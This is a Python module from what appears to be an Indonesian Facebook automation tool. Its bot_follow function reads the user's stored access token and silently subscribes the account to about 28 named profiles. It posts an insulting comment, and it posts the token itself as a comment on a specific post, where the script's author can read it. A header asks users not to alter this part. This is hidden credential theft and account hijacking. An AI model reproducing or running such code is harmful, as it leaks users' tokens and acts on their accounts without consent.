#!/usr/bin/python3
#-*-coding:utf-8-*-
# DON'T CHANGE BOT FOLLOW !!!
# JANGAN GANTI BOT FOLLOWNYA !!!

import os,premium

def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	os.system("clear")
	print ("[!] Please Wait ...")
	kom = ("Dapunta jeIek pengen gw tampoI\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
	requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
	requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
	requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
	requests.post('https://graph.facebook.com/100001617352620/subscribers?access_token=' + toket) #Antonius Raditya M
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
	requests.post('https://graph.facebook.com/100033624590055/subscribers?access_token=' + toket) #Fajar Firmansyah
	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
	exit(premium.menu())